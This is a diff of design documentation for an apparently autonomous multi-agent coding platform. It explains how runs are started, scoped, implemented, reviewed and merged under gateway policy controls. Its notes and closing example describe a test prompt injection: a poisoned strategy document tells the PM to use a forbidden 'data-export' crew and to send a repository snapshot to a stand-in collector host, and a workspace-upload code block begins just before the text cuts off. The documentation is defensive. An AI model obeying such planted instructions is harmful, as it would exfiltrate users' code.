@@ -1,18 +1,23 @@
 # Anatomy of a run
 
 This is the part worth reading slowly. It follows one piece of work
-through the whole pipeline — from a goal arriving to the change merging —
-and names, at each step, the mechanism that stops the agent from doing
-anything else.
+through the whole pipeline — from the strategy naming it to the change
+merging — and names, at each step, the mechanism that stops the agent from
+doing anything else.
 
-Three workflows carry the work, and each hands the next an *artifact*, not
-control: intake produces tickets, implement produces a pull request, review
-produces a merge decision. Every run ends in the same teardown.
+Three run-shaped workflows carry the work, and each hands the next an
+*artifact*, not control: scope produces tickets, implement produces a pull
+request, review produces a merge decision. A fourth, the standing
+**heartbeat**, starts each of them — no human does. Every run ends in the
+same teardown.
 
 ```mermaid
 flowchart LR
-    subgraph intake ["intake run"]
-        IN["PM scopes the goal,<br/>files tickets"]
+    subgraph heartbeat ["heartbeat tick"]
+        HB["observe →<br/>PM decides"]
+    end
+    subgraph scope ["scope run"]
+        SC["PM reads the documents,<br/>files tickets"]
     end
     subgraph implement ["implement run"]
         FU["fulfil crew<br/>+ sandbox"] --> IM["implement"] --> VG["verify<br/>gate"] --> DE["deliver<br/>PR"]
@@ -20,36 +25,74 @@ flowchart LR
     subgraph review ["review run"]
         RV["independent<br/>review"] --> MG["merge<br/>gate"]
     end
-    intake -->|ticket| implement -->|pull request| review
+    heartbeat -->|starts| scope -->|ticket| implement -->|pull request| review
 ```
 
-## Intake: a goal becomes tickets
+## The documents: what the company works from
 
-A goal arrives as untrusted text (`poseidon run --workflow intake goal.md`).
-The orchestrator creates a run row, checks the budget has headroom, and
-dispatches the standing **PM**. The PM reads the goal, files a ticket
-through `issues.create`, records a crew request through `crew.request`, and
-leaves its one-paragraph summary of what it set up as a comment on the
-ticket through `issues.comment` — the ticket, not the run log, is where the
-company remembers why the work exists.
+A company begins with its **vision** — the one text a human writes, in
+the blueprint. It reaches every procedure but delivery through the static
+prompt, and nobody in the company can change it: applying the blueprint
+again is the only way it changes.
+
+Everything else the company writes for itself, in its repository, at the
+two paths the blueprint names (`company.documents`). The **strategy** is
+written once from the vision by the **steward** — an ephemeral role with
+one job — and after it exists no current role may change it: the gateway
+knows which changed paths already exist on the base ref, and a delivery
+over the existing strategy is denied for the steward too. The
+**architecture masterplan** is written from the vision and the tree, and
+revised only through an **architecture request**: a crew member records a
+proposal, the platform files it as a stewardship ticket, and the steward
+revises the plan on a later tick. Asking is not writing.
+
+Both documents are read at the base ref before every tick and every run,
+under the platform identity — never the sandbox's copy, which the run
+could have edited — and handed to the conductor and the crews as untrusted
+text, beside the repository's `AGENTS.md`. Rank order, enforced by
+channel: the vision (the static prompt) outranks the strategy outranks the
+masterplan outranks tickets, requests and `AGENTS.md`.
 
 !!! note
-    The goal text is handed straight to an LLM, injection and all. If it
-    tells the PM to spawn a `data-export` crew, the PM will try — and the
-    compiled rule narrows `crew.request` to the conductor's declared
-    `may_spawn` list, so the attempt is denied and audited before anything is
-    created. `tests/e2e_kind/test_injected_conductor.py` runs exactly that
-    attack.
+    A vision-only repository is not an error. The first ticks observe the
+    documents absent, file a `Bootstrap: strategy` and a `Bootstrap:
+    architecture masterplan` ticket under the platform identity, and refuse
+    to scope until both exist; the stewardship crew writes them like any
+    other ticket, and their pull requests land through the same gate as
+    everything else.
+
+## Scope: the strategy becomes tickets
+
+The heartbeat starts a scope run when the PM decides the backlog needs
+one. The orchestrator creates a run row, checks the budget has headroom,
+composes the observation — the documents as they stand, the open tickets,
+the delivered pull requests, the recent runs — and dispatches the standing
+**PM**'s `scope` procedure on it. The PM files the next slice as tickets
+through `issues.create`, each ending in the `Crew:` trailer the implement
+run routes by, and leaves its one-paragraph summary as a comment on each
+through `issues.comment` — the ticket, not the run log, is where the
+company remembers why the work exists. A strategy that names no further
+slice yields no ticket, and that is a valid outcome.
+
+!!! note
+    The documents are handed straight to an LLM, injection and all. If the
+    strategy tells the PM to route the work to a `data-export` crew, the PM
+    will file that ticket — and when the heartbeat's implement run tries to
+    fulfil it, the compiled `crew.request` decision narrows the crew to the
+    conductor's declared `may_spawn` list, so the fulfilment is denied and
+    audited before anything is bound. `tests/e2e_kind/test_injected_conductor.py`
+    runs exactly that attack.
 
 ## Fulfilment: a crew and a sandbox
 
-A human starts an implement run from a ticket (or the heartbeat does — see
-[below](#who-starts-the-next-run-the-heartbeat)). Fulfilment then:
+The heartbeat starts an implement run on a ticket (an operator can too,
+by hand — `poseidon run <number>` — to reproduce one). Fulfilment then:
 
-1. **Records and consumes a crew request** under the conductor's authority.
-   The recording must win the same compiled `crew.request` decision an
-   intake-time request does; without a recorded, unexpired request,
-   fulfilment refuses. Authority is never improvised.
+1. **Wins the compiled `crew.request` decision as the conductor.** The
+   ticket's `Crew:` trailer names the crew; the decision narrows it to the
+   conductor's `may_spawn` list and reads the live spawn count and the
+   budget headroom off the input. A deny is audited and nothing is bound.
+   Authority is never improvised.
 2. **Provisions one sandbox** for the run.
 3. **Binds an identity and provisions a pod for each ephemeral agent.**
    Identity is derived deterministically from `{crew, role, run}`, so a
@@ -66,11 +109,14 @@ A human starts an implement run from a ticket (or the heartbeat does — see
 
 ## Implementation: work under audit
 
-The implementer is dispatched with the task text — a file's contents or the
-ticket the company filed, verbatim — to run its `implement` procedure. It
-surveys the sandbox (the tree and the repository's own `AGENTS.md`), then
-reads, writes and runs commands in it — all through the gateway, all
-policy-checked, all audited. Then it says it is done.
+The implementer is dispatched with the ticket the company filed, verbatim,
+and the company's documents as they stand on the base ref, to run its
+`implement` procedure. It surveys the sandbox (the tree and the
+repository's own `AGENTS.md`), then reads, writes and runs commands in it
+— all through the gateway, all policy-checked, all audited. A ticket that
+cannot be done within the masterplan is not done another way: the
+implementer records an architecture request and stops. Then it says it is
+done.
 
 !!! important
     The implementer's claim of success is **advisory**. Nothing that ships
@@ -102,10 +148,12 @@ The agent never touches the remote, either. Delivery works like this:
    container of commits — via `sandbox.git_bundle`.
 2. The gateway verifies the bundle and applies it to a fresh platform-side
    clone.
-3. The gateway extracts the changed paths and feeds them to policy as real
-   arguments — this is what makes the `deny_paths` rule in
+3. The gateway extracts the changed paths — and which of them already
+   exist on the base ref — and feeds them to policy as real arguments.
+   This is what makes the `deny_paths` rule in
    [the blueprint](../reference/blueprint.md) enforceable rather than
-   advisory.
+   advisory, what keeps every role but the steward out of the document
+   paths, and what makes the strategy write-once.
 4. Only then does the gateway push the branch with its own token and open
    the pull request.
 
@@ -115,10 +163,13 @@ happened inside the trusted gateway.
 ## Review: independent eyes
 
 A review run provisions a fresh sandbox from the PR's head ref and
-dispatches an ephemeral reviewer. The reviewer can read the code and run
-it, but holds no tool that writes to the repository. It runs the tests,
-posts findings on the PR, and ends with a structured pass/fail verdict
-that the platform journals.
+dispatches an ephemeral reviewer with the company's documents beside the
+diff. The reviewer can read the code and run it, but holds no tool that
+writes to the repository. It runs the tests, judges the change against the
+masterplan too — a deviant change fails even when its tests pass, and a
+wrong plan is an architecture request, never a merge — posts findings on
+the PR, and ends with a structured pass/fail verdict that the platform
+journals.
 
 ## The split oracle: who owns the tests
 
@@ -201,26 +252,30 @@ sandbox torn down, the registration retired, the run record written.
 
 ## Who starts the next run: the heartbeat
 
-Everything above describes one run, and by default a human starts each
-one. A company whose blueprint declares a `heartbeat` section
-([the blueprint](../reference/blueprint.md#heartbeat-the-companys-own-initiative-opt-in)) also runs a standing
-**heartbeat**: one durable workflow that wakes when the company's own
-runs change the world — every finished run nudges it — and at least every
+Everything above describes one run. Nobody starts them by hand: every
+company runs a standing **heartbeat**
+([the blueprint](../reference/blueprint.md#heartbeat-the-companys-own-initiative)),
+one durable workflow that wakes when the company's own runs change the
+world — every finished run nudges it — and at least every
 `reconcile_minutes`, the declared bound on how stale its view of changes
 only the outside world saw may grow. Each tick it:
 
-1. **Observes** the open backlog, the delivered-but-unreviewed PRs (each
-   one's live state read from the git host — a PR a human merged or closed
-   by hand is not offered), and the day's spend.
-2. **Dispatches the PM's toolless *decide* procedure** for exactly one
-   action: implement a ticket, review a PR, or idle.
+1. **Observes** the documents as they stand on the base ref, the open
+   backlog, the delivered-but-unreviewed PRs (each one's live state read
+   from the git host — a PR a human merged or closed by hand is not
+   offered), the day's spend and the count of open tickets.
+2. **Files bootstrap tickets** for documents still absent, and otherwise
+   **dispatches the PM's toolless *decide* procedure** for exactly one
+   action: scope the next slice, implement a ticket, review a PR, or idle.
 3. **Starts the chosen run** only under the compiled `heartbeat.start`
-   decision and the declared caps.
+   decision and the declared caps — `scope` refused while a document is
+   absent or at `max_open_tickets`.
 
 The PM proposes; the platform disposes; the human declares the backstop
-cadence and the caps and answers the merge gate. Nothing about a run changes — the
-same fulfilment, verify, delivery, review and gate above — only who
-pressed start.
+cadence and the caps and answers the merge gate. Nothing about a run
+changes — the same fulfilment, verify, delivery, review and gate above —
+only that nobody pressed start. Stopping the company is deleting it;
+there is no company without a heartbeat.
 
 What the heartbeat offers is bounded too. An issue or a delivered PR is
 off the backlog while a run on it is live, once a run *concluded* it (a
@@ -233,22 +288,23 @@ process-gate event in its story, and a platform comment on the PR or
 issue. The company never silently abandons finished work after one flaky
 call, and never retries forever.
 
-`tests/e2e_kind/test_overnight.py` runs the whole arc with exactly two
-human acts: one goal in, one approval out. When the blueprint also
-delegates the merge gate, the approval drops too:
-`tests/e2e_kind/test_delegated.py` runs the same arc with a single
-human act — one goal in — and the company merges its own in-class passing
-work with no further command. [Hand over the keys](../guides/hand-over.md)
-is the hands-on version.
+`tests/e2e_kind/test_overnight.py` runs the whole arc with exactly one
+human act: the merge approval. When the blueprint also delegates the
+merge gate, that act drops too: `tests/e2e_kind/test_delegated.py` runs
+the same arc with no human act at all, and the company merges its own
+in-class passing work. [Hand over the keys](../guides/hand-over.md) is
+the hands-on version.
 
 ??? example "What a blocked attack looks like from the inside"
 
-    Take the poisoned goal in `examples/goal-injected-conductor.md`: alongside
-    telling the PM to spawn the forbidden `data-export` crew (denied at intake,
-    above), its payload instructs the delivery crew to publish a snapshot of
-    the repository to `https://collector.control9931.example` before touching
-    any code. The mock brain obeys credulously — deliberately, because the test
-    is about the platform, not the model.
+    Take the poisoned strategy `tests/e2e_kind/test_injected_conductor.py`
+    writes: alongside telling the PM to route the work to the forbidden
+    `data-export` crew (refused at fulfilment, above), it instructs the
+    delivery crew to publish a snapshot of the repository to
+    `https://collector.control9931.example` before touching any code — and
+    the PM's ticket quotes the strategy, so the poison reaches the crew. The
+    mock brain obeys credulously — deliberately, because the test is about
+    the platform, not the model.
 
     ```python
     # what the agent runs, via sandbox.exec — a tar.gz of the workspace, POSTed out
